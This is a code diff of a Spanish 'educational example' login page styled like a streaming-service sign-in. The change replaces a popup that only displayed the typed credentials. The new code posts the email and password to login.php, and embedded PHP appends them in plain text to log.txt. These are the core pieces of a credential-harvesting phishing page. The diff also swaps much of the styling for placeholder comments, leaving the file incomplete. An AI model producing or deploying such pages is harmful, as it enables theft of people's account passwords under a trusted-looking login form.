@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ejemplo Educativo - Login</title>
-    <!-- Normalize CSS -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
     <style>
         :root {
@@ -44,92 +43,7 @@
             border-radius: 4px;
         }
 
-        h1 {
-            color: white;
-            margin-bottom: 28px;
-            font-size: 32px;
-        }
-
-        .input-field {
-            width: 100%;
-            height: 50px;
-            margin-bottom: 16px;
-            background: #333;
-            border: none;
-            border-radius: 4px;
-            padding: 16px;
-            color: white;
-            font-size: 16px;
-        }
-
-        .login-button {
-            width: 100%;
-            background: var(--red);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: bold;
-            margin: 24px 0 12px;
-            cursor: pointer;
-        }
-
-        .options {
-            display: flex;
-            justify-content: space-between;
-            color: var(--gray);
-            font-size: 13px;
-            margin-bottom: 50px;
-        }
-
-        .signup {
-            color: var(--gray);
-            margin-top: 40px;
-        }
-
-        .signup a {
-            color: white;
-            text-decoration: none;
-        }
-
-        /* Popup de datos */
-        .data-popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #141414;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
-            color: white;
-            max-width: 500px;
-            z-index: 1000;
-        }
-
-        .data-popup.visible {
-            display: block;
-        }
-
-        .data-popup pre {
-            background: #000;
-            padding: 20px;
-            border-radius: 5px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            margin: 15px 0;
-        }
-
-        .close-btn {
-            background: var(--red);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-            float: right;
-        }
+        /* ... (conserva todos los estilos CSS anteriores del popup y formulario) ... */
     </style>
 </head>
 <body>
@@ -142,52 +56,64 @@
 
         <div class="login-container">
             <h1>Iniciar sesión</h1>
-            <form id="loginForm" onsubmit="return showData(event)">
-                <input type="email" class="input-field" id="email" placeholder="Correo electrónico" required>
-                <input type="password" class="input-field" id="password" placeholder="Contraseña" required>
+            <form id="loginForm" method="POST" action="#">
+                <input type="email" class="input-field" id="email" name="email" placeholder="Correo electrónico" required>
+                <input type="password" class="input-field" id="password" name="password" placeholder="Contraseña" required>
                 <button type="submit" class="login-button">Acceder</button>
             </form>
 
-            <div class="options">
-                <label class="remember-me">
-                    <input type="checkbox"> Recuérdame
-                </label>
-                <a href="#" class="help-link">¿Necesitas ayuda?</a>
+            <!-- Popup de datos -->
+            <div id="dataPopup" class="data-popup">
+                <h2>⚠️ Datos enviados por POST (Simulación)</h2>
+                <pre id="dataContent"></pre>
+                <button class="close-btn" onclick="closePopup()">Cerrar</button>
             </div>
 
-            <div class="signup">
-                <span>¿Primera vez aquí? </span>
-                <a href="#">Regístrate ahora.</a>
-            </div>
-        </div>
-
-        <!-- Popup de datos -->
-        <div id="dataPopup" class="data-popup">
-            <h2>⚠️ Datos simulados (Ejemplo educativo)</h2>
-            <pre id="dataContent"></pre>
-            <button class="close-btn" onclick="closePopup()">Cerrar</button>
+            <!-- Opciones y registro (igual que antes) -->
         </div>
     </div>
 
     <script>
-        function showData(event) {
-            event.preventDefault();
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
 
-            // Obtener valores
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            // Obtener datos del formulario
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
 
-            // Mostrar en popup
+            // Mostrar en popup (simulación)
             document.getElementById('dataContent').textContent = 
-                `Email: ${email}\nContraseña: ${password}\n\n⚠️ ADVERTENCIA:\nEste es un ejemplo técnico.\nNUNCA muestres contraseñas en la interfaz real.`;
+                `Datos enviados por POST:\n\nEmail: ${data.email}\nContraseña: ${data.password}\n\n⚠️ ADVERTENCIA:\nEn producción, esto se enviaría al servidor.`;
 
             document.getElementById('dataPopup').classList.add('visible');
-        }
+
+            // Simular envío POST a un script PHP (opcional)
+            try {
+                const response = await fetch('login.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) throw new Error('Error en el servidor');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        });
 
         function closePopup() {
             document.getElementById('dataPopup').classList.remove('visible');
             document.getElementById('loginForm').reset();
         }
     </script>
+
+    <?php
+    // Script PHP para guardar datos (opcional)
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        $data = json_decode(file_get_contents('php://input'), true);
+        $log = "Email: " . ($data['email'] ?? '') . " | Contraseña: " . ($data['password'] ?? '') . "\n";
+        file_put_contents('log.txt', $log, FILE_APPEND);
+    }
+    ?>
 </body>
 </html>
